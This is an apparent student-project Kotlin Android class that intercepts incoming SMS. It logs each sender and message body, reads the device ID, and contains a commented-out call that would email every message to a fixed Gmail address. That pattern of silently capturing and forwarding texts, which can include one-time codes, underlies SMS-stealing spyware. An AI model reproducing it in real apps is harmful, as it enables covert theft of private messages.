package com.example.mobileappproj.security

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.provider.Telephony
import android.util.Log

class SMSBroadcastReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // Only processing for Android versions KitKat and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Telephony.Sms.Intents.getMessagesFromIntent(intent).forEach { smsMessage ->
                val sender = smsMessage.displayOriginatingAddress
                val messageBody = smsMessage.displayMessageBody
                Log.d(TAG, "Sender: $sender Message: $messageBody")
                val androidID = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                // Sending email using the sender's address as the subject and the message body as the email content
               // EmailHelper.sendEmail("aspjgroup4nyp@gmail.com", sender, messageBody)
            }
        }
    }

    companion object {
        private const val TAG = "SMSBroadcastReceiver"
    }
}
